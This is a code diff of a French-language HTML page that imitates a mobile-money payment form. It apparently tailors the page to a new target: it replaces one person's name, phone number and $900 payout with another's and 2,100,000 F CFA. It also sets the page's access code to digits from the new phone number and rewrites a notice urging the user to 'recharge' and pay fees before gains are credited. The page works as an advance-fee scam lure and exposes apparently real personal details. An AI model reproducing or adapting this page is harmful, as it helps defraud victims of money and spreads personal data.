@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Kahenha Mboma Moise" disabled />
+        <input type="text" id="name" value="Abdoul Azise Ouattara" disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+243 08 30 88 18 21" disabled />
+        <input type="tel" id="phone" value="+2237938065" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="$900 " disabled />
+        <input type="text" id="amount" value="2 100 000 F CFA " disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,10 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-        ⚠️ Veuillez recharger payer les frais de réseau afin de terminer la transaction.
+         Action requise : Rechargez votre compte pour finaliser la transaction en toute sécurité.
+
+Cette étape est indispensable pour valider votre opération auprès de notre serveur de paiement.
+✅ Une fois le rechargement effectué, vos bénéfices seront crédités instantanément sur votre compte.
       </div>
     </form>
   </div>
@@ -212,7 +215,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "1821") {
+      if (code === "8065") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
